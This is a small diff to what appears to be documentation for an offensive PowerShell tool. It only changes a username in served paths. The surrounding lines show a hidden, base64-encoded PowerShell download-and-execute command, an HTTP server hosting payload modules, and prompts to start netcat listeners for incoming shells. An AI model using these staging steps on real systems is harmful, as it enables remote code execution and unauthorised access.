@@ -112,7 +112,7 @@ powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw
 
 
 [!] Starting HTTP server on wg0 port 8080
-[!] Currently serving: /home/x0rw3ll/.local/share/powershell/Modules/PSX/extensions
+[!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
 [!] Ctrl+C terminates the server
 
 WARNING: Do not forget to start a netcat listener on port 4455
@@ -135,7 +135,7 @@ powershell -nop -ep unrestricted -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw
 
 
 [!] Starting HTTP server on wg0 port 80
-[!] Currently serving: /home/x0rw3ll/.local/share/powershell/Modules/PSX/extensions
+[!] Currently serving: /home/kali/.local/share/powershell/Modules/PSX/extensions
 [!] Ctrl+C terminates the server
 
 WARNING: Do not forget to start a netcat listener on port 445
